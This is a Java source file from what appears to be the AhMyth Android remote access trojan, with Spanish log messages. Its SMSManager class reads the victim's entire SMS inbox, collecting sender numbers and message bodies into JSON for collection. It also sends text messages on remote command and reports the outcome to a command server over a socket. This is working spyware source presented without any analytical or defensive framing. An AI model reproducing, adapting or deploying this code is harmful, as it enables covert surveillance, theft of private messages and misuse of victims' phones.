package ahmyth.mine.king.ahmyth;

import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by AhMyth on 11/10/16.
 */

public class SMSManager {

    public static JSONObject getSMSList() {
        Cursor cur = null;
        try {
            JSONObject SMSList = new JSONObject();
            JSONArray list = new JSONArray();

            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);

            if (cur != null) {
                while (cur.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    String address = cur.getString(cur.getColumnIndex("address"));
                    String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                    sms.put("phoneNo", address);
                    sms.put("msg", body);
                    list.put(sms);
                }
                SMSList.put("smsList", list);
                Log.e("SMS", "Lista de SMS recolectada");
            }
            return SMSList;
        } catch (Exception e) {
            Log.e("SMS", "Error obteniendo lista de SMS", e);
            e.printStackTrace();
        } finally {
            if (cur != null) cur.close();
        }
        return null;
    }

    public static void sendSMS(String phoneNo, String msg) {
        try {
            Log.i("SMS", "Intentando enviar SMS a: " + phoneNo + ", mensaje: " + msg);
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            
            // ✅ Emitir respuesta de éxito al servidor
            JSONObject result = new JSONObject();
            try {
                result.put("ok", true);
                result.put("message", "SMS sent successfully");
            } catch (JSONException e) {
                Log.e("SMS", "Error creando JSON de éxito", e);
            }
            IOSocket.getInstance().getIoSocket().emit("send-sms-result", result);
            Log.i("SMS", "✅ SMS enviado correctamente y respuesta emitida");
            
        } catch (Exception ex) {
            Log.e("SMS", "❌ Error enviando SMS: " + ex.getMessage());
            ex.printStackTrace();
            
            // ✅ Emitir respuesta de error al servidor
            JSONObject result = new JSONObject();
            try {
                result.put("ok", false);
                result.put("error", ex.getMessage());
            } catch (JSONException e) {
                Log.e("SMS", "Error creando JSON de error", e);
            }
            IOSocket.getInstance().getIoSocket().emit("send-sms-result", result);
        }
    }
}